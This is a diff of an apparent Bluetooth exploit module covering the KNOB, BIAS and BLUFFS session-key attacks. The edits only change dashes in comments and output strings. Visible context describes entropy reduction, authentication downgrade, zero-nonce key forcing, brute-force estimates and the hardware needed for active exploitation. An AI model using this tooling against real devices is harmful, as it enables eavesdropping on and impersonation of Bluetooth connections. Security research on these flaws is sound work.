@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
-# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+# Author: André Henrique (@mrhenrike) | União Geek - https://github.com/Uniao-Geek
 """Native BT Classic session key attacks: KNOB, BIAS, BLUFFS.
 
 Unified module implementing analysis and exploitation of Bluetooth BR/EDR
 session establishment vulnerabilities:
 
-  - KNOB (CVE-2019-9506): Entropy reduction — forces minimum key length (1 byte)
+ - KNOB (CVE-2019-9506): Entropy reduction - forces minimum key length (1 byte)
     during LMP_encryption_key_size_req negotiation, making session key brutable.
-  - BIAS (CVE-2020-10135): Impersonation — role switching + legacy auth downgrade
+ - BIAS (CVE-2020-10135): Impersonation - role switching + legacy auth downgrade
     to bypass mutual authentication on Secure Connections devices.
-  - BLUFFS (CVE-2023-24023): Session key overwrite — forces predictable session
+ - BLUFFS (CVE-2023-24023): Session key overwrite - forces predictable session
     keys across sessions by manipulating AU_RAND/EN_RAND to all-zeros.
 
 All three attacks share the same underlying BT crypto primitives (SAFER+ H,
@@ -204,7 +204,7 @@ class Exploit(Exploit):
             "BIAS (CVE-2020-10135): impersonation via legacy auth downgrade. "
             "BLUFFS (CVE-2023-24023): session key overwrite via zero nonces. "
             "Includes PCAP analysis, session key verification, and entropy "
-            "brute-force. Native implementation — no external tools for analysis."
+            "brute-force. Native implementation - no external tools for analysis."
         ),
         "authors": (
             "André Henrique (@mrhenrike) | União Geek",
@@ -263,16 +263,16 @@ class Exploit(Exploit):
                         "MEDIUM" if session.key_size <= 7 else "OK"
                     )
                 )
-                print_info(f"  Key size: {session.key_size} bytes ({session.key_size * 8} bits) — {severity}")
+                print_info(f"  Key size: {session.key_size} bytes ({session.key_size * 8} bits) - {severity}")
             else:
                 print_info("  Key size: not negotiated in this session")
 
             if session.has_knob_indicator:
-                print_success(f"  [KNOB] LOW ENTROPY DETECTED — key size {session.key_size} bytes")
+                print_success(f"  [KNOB] LOW ENTROPY DETECTED - key size {session.key_size} bytes")
                 print_info(f"  Session key can be brute-forced in {256 ** session.key_size} attempts.")
 
             if session.has_bluffs_indicator:
-                print_success("  [BLUFFS] ZERO NONCE PATTERN — AU_RAND and EN_RAND are all zeros")
+                print_success("  [BLUFFS] ZERO NONCE PATTERN - AU_RAND and EN_RAND are all zeros")
                 print_info("  Session key is constant across sessions (predictable).")
 
             if session.au_rands:
@@ -357,7 +357,7 @@ class Exploit(Exploit):
             print_info(f"  L={ent:2d}: {sk.hex()}{marker}")
 
         if au == ZERO_16 and en == ZERO_16:
-            print_success("[BLUFFS] Both nonces are zero — session key is constant!")
+            print_success("[BLUFFS] Both nonces are zero - session key is constant!")
 
     def _assess_device(self) -> None:
         """Assess device vulnerability to KNOB/BIAS/BLUFFS."""
@@ -384,10 +384,10 @@ class Exploit(Exploit):
         print_info("")
         print_info("=== Hardware Requirements for Active Exploitation ===")
         print_info("InternalBlue-compatible Broadcom/Cypress controllers required:")
-        print_info("  - CYW920819 evaluation board")
-        print_info("  - Nexus 5 (BCM4339)")
-        print_info("  - Raspberry Pi 3/4 (BCM43455)")
-        print_info("  - Samsung Galaxy S8 (BCM4361)")
+        print_info(" - CYW920819 evaluation board")
+        print_info(" - Nexus 5 (BCM4339)")
+        print_info(" - Raspberry Pi 3/4 (BCM43455)")
+        print_info(" - Samsung Galaxy S8 (BCM4361)")
         print_info("Firmware patches modify LMP handlers for key negotiation interception.")
 
 
